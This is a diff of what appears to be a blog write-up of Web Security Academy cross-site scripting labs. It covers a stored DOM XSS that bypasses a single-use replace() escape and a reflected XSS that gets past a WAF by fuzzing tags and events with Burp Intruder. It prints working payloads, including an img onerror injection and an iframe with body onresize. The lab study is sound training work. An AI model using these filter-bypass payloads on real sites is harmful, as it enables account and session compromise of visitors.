@@ -403,7 +403,7 @@ In this instance, a script on the page processes reflected data (user input) wit
 -
 
 #### 11. Stored DOM XSS
-In this instance, the application's comment functionality is vulnerable to stored DOM XSS, allowing me to embed and execute a `prompt()` call.
+In this instance, I bypass the application's escaping function to store a DOM‑based XSS payload. Whenever a visitor loads the page, the page fetches the comments stored on it and the visitor's browser executes a `prompt()` call."
 
 <details markdown="1">
   <summary>Click me to expand the process</summary>
@@ -416,21 +416,67 @@ In this instance, the application's comment functionality is vulnerable to store
     }
    ```
 
-  {: .box-note}
-  **Note:** A string pattern will only be replaced once. To perform a global search and replace, use a regex with the g flag, or use replaceAll() instead.
+   {: .box-note}
+   **Note:** A string pattern will only be replaced once. To perform a global search and replace, use a regex with the g flag, or use replaceAll() instead.
 
 2. Now that I know only the first set of angle brackets is escaped and anything after that isn't, I craft my payload as:
 
-  ~~~
-  Payload: <><img src="x" onerror="prompt('I am escaped!')">
-  Rendered:
-    <p>
-      &lt;&gt;
-      <img src="x" onerror="prompt('I am escaped!')">
-    </p>
-  ~~~
+   ~~~
+   Payload: <><img src="x" onerror="prompt('I am escaped!')">
+   Rendered:
+   <p>
+     &lt;&gt;
+     <img src="x" onerror="prompt('I am escaped!')">
+   </p>
+   ~~~
 
 3. A prompt pops up with a message after I submit (store) the payload in the comment section, which indicates the filter mechanism (`replace()` function) was bypassed and the application is still vulnerable to XSS."
+
+</details>
+-
+
+#### 12. Reflected XSS into HTML context with most tags and attributes blocked
+In this instance, I discover the vulnerability of XSS in search function of the application, and bypass the WAF to calls the print() function.
+
+<details markdown="1">
+  <summary>Click me to expand the process</summary>
+
+1. After using general XSS testing payloads, I learned that the WAF is blocking the tags.
+
+   ~~~
+   Payload: <img src="0" onerror="prompt()">
+   Respond: "Tag is not allowed"
+   ~~~
+
+2. To find out which tag wasn't blocked, I used Burp Intruder with all tag options (retrieved from the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)). The results showed that `<body>` was not blocked by the WAF.
+
+   ~~~
+   Burp Intruder:
+     GET /?search=<Payload Position> HTTP/2
+   ~~~
+
+3. After enclosing payloads within the `<body>` tag, I learned that the WAF is also blocking some attributes.
+
+   ~~~
+   Payload: <body onload="prompt()">
+   Respond: "Attributes is not allowed"
+   ~~~
+
+4. Repeating step 2, but this time I copy the events from the XSS cheat sheet. I got some events that comes back with 200 OK. 
+
+   ~~~
+   Burp Intruder:
+     GET /?search=<body%20<Payload Position>=print()>
+   ~~~
+
+5. To make the exploitation more realistic, after going through the unfiltered event attributes:
+   I used an `<iframe>` to embeds another webpage (`src="https[://]vulnerable[.]com/`) into the current page.
+   The query parameter `search` then load the URL-encoded payload `%22%3E%3Cbody+onresize=print()%3E`
+   `this.style.width` to adjust the iframe’s height, and trigger the `onresize` and `prompt()`.
+
+   ~~~
+   <iframe src="https[://]vulnerable[.]com/?search=%22%3E%3Cbody+onresize=print()%3E" onload=this.style.height='50px'></iframe>
+   ~~~
 
 </details>
 -
